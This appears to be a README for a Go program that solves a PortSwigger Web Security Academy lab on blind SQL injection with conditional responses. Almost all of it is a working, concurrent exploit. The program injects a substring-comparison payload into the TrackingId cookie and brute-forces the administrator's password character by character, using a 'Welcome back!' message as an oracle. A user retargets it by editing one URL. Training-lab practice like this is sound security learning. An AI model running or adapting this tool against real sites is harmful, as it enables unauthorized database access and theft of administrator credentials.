### PortSwigger Blind SQLi Solver (Conditional Responses)

A high-performance, concurrent Go program designed to solve the [Blind SQL injection with conditional responses](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses) lab on PortSwigger.

Before running, you must update the `TargetURL` in `main.go` as PortSwigger lab instances expire and change URLs.


```golang
package main

import (
	"context"
	"fmt"
	"compress/gzip"
	"io"
	"net/http"
	"strings"
	"sync"
)

const (
	TargetURL   = "https://0a1600b304ad9842847b270800370027.web-security-academy.net/"
	ConditionalResponse = "Welcome back!"
	MaxWorkers  = 50
	passLen = 20
	chars = "abcdefghijklmnopqrstuvwxyz" + // a-z
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +      // A-Z
	"0123456789"                      // 0-9
	// "!@#$%^&*()-_=+[]{}|;:',.<>?/`~" +  // Symbols (optional)
	// " " 
)
var Password []rune

var client = &http.Client{
	Timeout: 0, 
}



func main() {
	Password = make([]rune, 20)
	fmt.Println("[*] Starting Attack...")

	// Iterate through password positions sequentially
	for i := 1; i <= passLen; i++ {
		found := bruteForcePosition(i)
		if !found {
			fmt.Printf("\n[!] Could not find character for position %d. Stopping.\n", i)
			break
		}
	}
	fmt.Println("\n[*] Done.")
	// Print final password (ignoring index 0)
	fmt.Printf("[*] Final Password: %s\n", string(Password))

}

func bruteForcePosition(pos int) bool {
	// Create a buffered channel big enough for all chars so we don't block
	jobs := make(chan rune, len(chars))
	
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var wg sync.WaitGroup

	for _, ch := range chars {
		jobs <- ch
	}
	close(jobs) 

	foundCh := make(chan rune, 1)

	fmt.Printf("\r[*] Brute forcing position %d...", pos)

	for w := 0; w < MaxWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(ctx, jobs, pos, foundCh, cancel)
		}()
	}


	wg.Wait()
	close(foundCh)

	if foundChar, ok := <-foundCh; ok {
		Password[pos-1] = foundChar
		fmt.Printf("[+] Position %d found: %c\n", pos, foundChar)
		return true
	}

	return false
}

func worker(ctx context.Context, jobs <-chan rune, pos int, foundCh chan<- rune, cancel context.CancelFunc) {
	for ch := range jobs {
		// Check if context was cancelled by another worker
		select {
		case <-ctx.Done():
			return
		default:
		}

		if attack(ctx, pos, ch) {
			// Found it!
			select {
			case foundCh <- ch: // Send result
				cancel() // Stop other workers
			default:
			}
			return
		}
	}
}

func attack(ctx context.Context, pos int, ch rune) bool {
	
	req, err := http.NewRequestWithContext(ctx, "GET", TargetURL, nil)
	if err != nil {
		return false
	}
	condition := fmt.Sprintf("substring((SELECT%%20password%%20from%%20users%%20where%%20username=%%27administrator%%27),%d,1)=%%27%c", pos, ch)
	exploitedCookie := fmt.Sprintf("x%%27%%20OR%%20%s", condition)

	cookie := fmt.Sprintf("TrackingId=0xPelamar%s", exploitedCookie)
	req.Header.Add("Cookie", cookie)
	
	resp, err := client.Do(req)
	if err != nil {
		return false 
	}
	defer resp.Body.Close()

	var reader io.ReadCloser

	if resp.Header.Get("Content-Encoding") == "gzip" {
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return false
		}
		defer reader.Close()
	} else {
		reader = resp.Body
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		return false 
	}
	if strings.Contains(string(body), ConditionalResponse) {
		return true
	}
	return false
}

```
